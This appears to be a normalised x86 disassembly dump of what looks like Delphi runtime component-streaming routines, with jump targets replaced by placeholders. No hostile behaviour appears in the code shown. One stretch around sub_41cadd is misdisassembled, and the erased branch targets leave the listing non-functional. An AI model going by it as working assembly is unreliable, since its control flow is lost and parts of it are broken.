pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bf82
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
call sub_41b96c
sub_41bf88
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c028
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bb2c
test al al
jne r-xdata
mov eax ebx
call sub_41bb2c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_419124
jmp r-xdata
mov eax ebx
call sub_41be70
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_41ca98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c02f
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_419058
mov esi eax
mov eax ebx
call sub_41ca90
jmp r-xdata
mov eax ebx
call sub_41c9e0
mov eax ebx
call sub_41bb2c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41cbfc
mov eax ebx
call sub_41ca98
sub_41c058
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f18
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_418314
inc esi
dec ebx
jne r-xdata
sub_41c094
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_420d78
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f18
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050d4
add esp 0x4
mov edx ebx
mov eax edi
call sub_420d4c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f18
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_420d4c
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41c10c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404f18
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41c174
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41c194
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40276c
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41c174
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_41dbc4
call sub_40276c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403190
sub_41c1f4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c2da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dd64
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41c2ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c2df
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c194
pop ecx
test al al
jne r-xdata
call sub_4039d8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403984
sub_41c304
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c37c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_40338c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_417e30
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c381
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c194
pop ecx
test al al
jne r-xdata
call sub_4039d8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403984
sub_41c3a4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c41f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dd64
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_40338c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c424
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c194
pop ecx
test al al
jne r-xdata
call sub_4039d8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403984
sub_41c448
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c669
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41d6f4
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41d6f4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41c639
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41c5f7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c094
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c10c
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c1f4
pop ecx
push ebp
call sub_41c3a4
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c304
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403a08
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c10c
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c10c
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c670
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050e0
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_40338c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_4184cc
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c058
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418314
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c058
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418314
sub_41c5fc
push ebp
call sub_41c174
pop ecx
test al al
je r-xdata
call sub_403984
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403190
sub_41c684
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c6f4
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41c6df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c6f4
mov eax [ ebp - 0x4 ]
call sub_41bc44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bd88
retn
sub_41c6f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bb2c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41cbfc
mov eax [ ebp - 0x4 ]
call sub_41ca98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40338c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41c7b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40338c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bb2c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c448
mov eax [ ebp - 0x4 ]
call sub_41ca98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7bd
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41c7c4
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41d8d0
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca4c
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41be94
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41c808
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41d8d0
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca4c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41be94
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41c84c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d8d0
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca4c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41be94
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41c89c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d8d0
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ca4c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41be94
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41c8e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41d8d0
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41b96c
mov al [ eax + lookup_table_41c907 ]
jmp [ eax * 4 + jump_table_41c915 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41be94
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404010
mov eax esi
call j_sub_4043ec
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41be94
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f74
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f74
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f74
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f74
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41c9e0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d8d0
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41be94
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41be94
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41be94
jmp r-xdata
jmp r-xdata
call sub_41b96c
sub_41ca4c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41be70
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41c9e0
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41d8d0
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41be94
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41caa0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41be70
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41d8d0
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41c9e0
mov [ edi ] eax
sub_41cadd
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cbd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fb8
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b95c
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cbd8
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404184
sub_41cbfc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41cdcc
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_40379c#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41d6f4
xor edx edx
push ebp
push j_sub_40379c
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4041e0
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404440
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033d0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414990
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033d0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_414990
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41cf80
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41be80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41be80
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40331c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414a84
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41cbe0
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cdd3
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov edi ebx
jmp r-xdata
sub_41cd94
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403984
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cdd3
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
sub_41cddc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_417cd8
mov ebx eax
test ebx ebx
je r-xdata
call sub_41b96c
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414af8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41ce24
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b400
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418314
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41ce64
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41ceb3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41dfe8
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_415318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ceba
lea eax [ ebp - 0x10 ]
call sub_40eecc
retn
sub_41cec0
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41cf72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41be70
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c8e0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b400
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_418314
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d8d0
lea eax [ ebp - 0x4 ]
call sub_40578c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4154b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf79
lea eax [ ebp - 0x8 ]
call sub_403f20
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
sub_41cf80
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d27b
